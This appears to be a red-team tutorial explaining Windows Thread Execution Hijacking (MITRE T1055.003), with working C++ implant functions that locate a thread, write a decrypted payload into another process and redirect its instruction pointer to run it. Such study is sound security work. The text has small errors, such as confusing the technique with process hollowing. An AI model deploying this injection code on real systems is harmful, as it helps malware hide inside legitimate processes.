# Wumbobfuscating Process Injection Techniques
The C/C++ code exemplifying the process injection techniques below was originally written by [Sektor7 Institute](https://institute.sektor7.net/) within their [Malware Development Intermediate](https://institute.sektor7.net/courses/rto-maldev-intermediate) course. The explanations and analysis of the code are entirely my own.

## Thread Execution Hijacking

### Background
Process injection describes a collection of attack techniques involving the execution of arbitrary code into a live process. Beyond the execution of arbirtrary code, successful process injection may lead to privilege escalation and/or access to the system/network resources of a hijacked process.

Note that successful process injection requires significant prototyping, as the manipulation of a targeted process or thread may cause it to crash before, during, or after successful payload execution.

Thread Execution Hijacking is a process injection subtechnique that manipulates [thread context](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context), a conglomerate of data related to key information about an executed thread, which is stored in a structure exemplified below. Key elements of this structure - notably `ContextFlags`, `Eip`, and `Rip` - are referenced in the development process.

```c++
typedef struct _CONTEXT {
  DWORD64 P1Home;
  DWORD64 P2Home;
  DWORD64 P3Home;
  DWORD64 P4Home;
  DWORD64 P5Home;
  DWORD64 P6Home;
  DWORD   ContextFlags;
  DWORD   MxCsr;
  WORD    SegCs;
  WORD    SegDs;
  WORD    SegEs;
  WORD    SegFs;
  WORD    SegGs;
  WORD    SegSs;
  DWORD   EFlags;
  DWORD64 Dr0;
  DWORD64 Dr1;
  DWORD64 Dr2;
  DWORD64 Dr3;
  DWORD64 Dr6;
  DWORD64 Dr7;
  DWORD64 Rax;
  DWORD64 Rcx;
  DWORD64 Rdx;
  DWORD64 Rbx;
  DWORD64 Rsp;
  DWORD64 Rbp;
  DWORD64 Rsi;
  DWORD64 Rdi;
  DWORD64 R8;
  DWORD64 R9;
  DWORD64 R10;
  DWORD64 R11;
  DWORD64 R12;
  DWORD64 R13;
  DWORD64 R14;
  DWORD64 R15;
  DWORD64 Rip;
  union {
    XMM_SAVE_AREA32 FltSave;
    NEON128         Q[16];
    ULONGLONG       D[32];
    struct {
      M128A Header[2];
      M128A Legacy[8];
      M128A Xmm0;
      M128A Xmm1;
      M128A Xmm2;
      M128A Xmm3;
      M128A Xmm4;
      M128A Xmm5;
      M128A Xmm6;
      M128A Xmm7;
      M128A Xmm8;
      M128A Xmm9;
      M128A Xmm10;
      M128A Xmm11;
      M128A Xmm12;
      M128A Xmm13;
      M128A Xmm14;
      M128A Xmm15;
    } DUMMYSTRUCTNAME;
    DWORD           S[32];
  } DUMMYUNIONNAME;
  M128A   VectorRegister[26];
  DWORD64 VectorControl;
  DWORD64 DebugControl;
  DWORD64 LastBranchToRip;
  DWORD64 LastBranchFromRip;
  DWORD64 LastExceptionToRip;
  DWORD64 LastExceptionFromRip;
} CONTEXT, *PCONTEXT;
```

Manipulation of thread context involves suspending an existing process, unmapping (hollowing) its memory, and replacing this memory with redirection to a payload.

Thread Execution Hijacking is defined in the MITRE ATT&CK Framework as [T1055.003](https://attack.mitre.org/techniques/T1055/003/).

The development process below is an extension to [the process injection template](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md) detailed in this repository.

## Developing Thread Execution Hijacking Techniques

#### Thread Execution Hijacking Stages
Thread Execution Hijacking typically begins when a malicious process is spawned. Afterward, the injection technique itself relies on several successful stages taking place. Each stage can be accomplished via multiple Windows API functions. A brief explanation of the stages and common functions leveraged to execute them is below:

1. [`CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot), [`EnumProcesses()`](https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocesses) - A list of running processes is generated.
</br> _Note: The enumeration and location of the target process takes place via a custom [`FindTarget()`](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md#process-targeting) function defined in the [Process Injection Template](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md#aes-decryption)_

2. [`CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD)`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) - A list of running threads is generated.
3. [`Thread32Next()`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32next) - Threads in the list returned by [`CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD)`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) are iterated through, so that a thread corresponding to the targeted process can be discovered.
4. [`OpenThread()`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread) - A handle to the targeted thread is opened and returned to the program.
5. [`VirtualAllocEx()`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) - An empty buffer of memory is allocated within the a target process.
6. [`WriteProcessMemory()`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) - The payload is written into the allocated memory within the target process.
7. [`SuspendThread`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread) - The targeted thread is suspended.
8. [`SetThreadContext()`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext) - Redirection of the [thread context](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context) to point to the written payload is set.
9. [`ResumeThread`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread) - The targeted thread is resumed, triggering the redirecting and executing the payload

It is important to underscore that, while classic process injection targets a running process, Thread Execution Hijacking goes one layer deeper by directly targeting the executing thread within a process. For this reason, in addition to different injection technique, a second targeting function is required to locate the running thread, after [the initial process targeting function](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md#process-targeting).

#### Thread Targeting
After [process targeting](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md#process-targeting) has occurred, a custom `FindThread()` function takes in the targeted Process ID (PID) and uses [`CreateToolhelp32Snapshot()`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) is called with the `TH32CS_SNAPTHREAD` argument to generate a list of running threads within the target process. A `while` loop checks each entry (`thEntry`) of this list by calling [`Thread32Next()`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32next), and compares (`==`) the Process ID (PID) (`th32OwnerProcessID`) to the PID of the targeted process. When a matching PID is located, `FindThread()` calls [`OpenThread()`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread) to return the handle of the corresponding thread.

Note that, in this example, `FindThread()` is not called within the `main()` function of the implant, only within the proceeding thread hijacking function (`InjectCTX`), where it returns the handle to the targeted thread.

```c++
HANDLE FindThread(int pid){

	HANDLE hThread = NULL;
	THREADENTRY32 thEntry;

	thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		
	while (Thread32Next(Snap, &thEntry)) {
		if (thEntry.th32OwnerProcessID == pid) 	{
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
			break;
		}
	}
	CloseHandle(Snap);
	
	return hThread;
}
```

#### Thread Hijacking
Note that this function begins by declaring a null handle (`hThread`) to the target thread, a null LPVOID-type pointer (`pRemoteCode`) which will eventually point to the injected payload, and a [CONTEXT](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context)-type variable (`ctx`), which is actually a structure containing the thread context that will be manipulated to perform the hijacking technique.

After calling the custom `FindThread()` function to return a handle to the target thread within the target process, payload decryption takes place via the custom [AESDecrypt](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md#aes-decryption) function shown in the [Process Injection Template](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md#aes-decryption).

Similar to classic process injection, memory is allocated within the target process using [`VirtualAllocEx()`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex), and the payload is written to this memory via [`WriteProcessMemory()`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory).

Then, the manipulation of thread context to achieve hijacking takes place. The thread is suspended using [`SuspendThread`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread), which takes the handle to the target thread (`hThread`) returned by the custom `InjectCTX` function, as an argument. The `ContextFlags` element of the [CONTEXT](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context) structure (`ctx`) is defined by the value `CONTEXT_FULL`, indicating that the full context object should be obtained by the proceeding call to [GetThreadContext](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext). Afterwards, redirection takes place when an architecture-appropriate instruction pointer (`Eip` / `Rip`) is designated as the pointer to the payload previously written into allocated memory. This change in the instruction pointer (`Eip` / `Rip`) is formalized by calling [`SetThreadContext()`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext), which takes the handle to the targeted thread (`hThread`) and the location of the [thread context structure](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context) (`&ctx`). Finally, the handle to the redirected thread (`hThread`) is passed to the [`ResumeThread`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread) function, which resumes the thread and therefore executes the corresponding payload stored in the process.

```c++
int InjectCTX(int pid, HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	HANDLE hThread = NULL;
	LPVOID pRemoteCode = NULL;
	CONTEXT ctx;

	// call FindThread() to locate a thread in target process
	hThread = FindThread(pid);
	if (hThread == NULL) {
		printf("Error, hijack unsuccessful.\n");
		return -1;
	}

	// decrypt payload
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
	
	// memory allocation
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
  
        // write payload to allocated memory
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);

	// suspend thread
	SuspendThread(hThread);	
	ctx.ContextFlags = CONTEXT_FULL;
  
        // retrieve thread context
	GetThreadContext(hThread, &ctx);
  
#ifdef _M_IX86 
	ctx.Eip = (DWORD_PTR) pRemoteCode;
#else
	ctx.Rip = (DWORD_PTR) pRemoteCode;
#endif

        // hijack thread context
	SetThreadContext(hThread, &ctx);
  
	// execute payload
	return ResumeThread(hThread);	
```
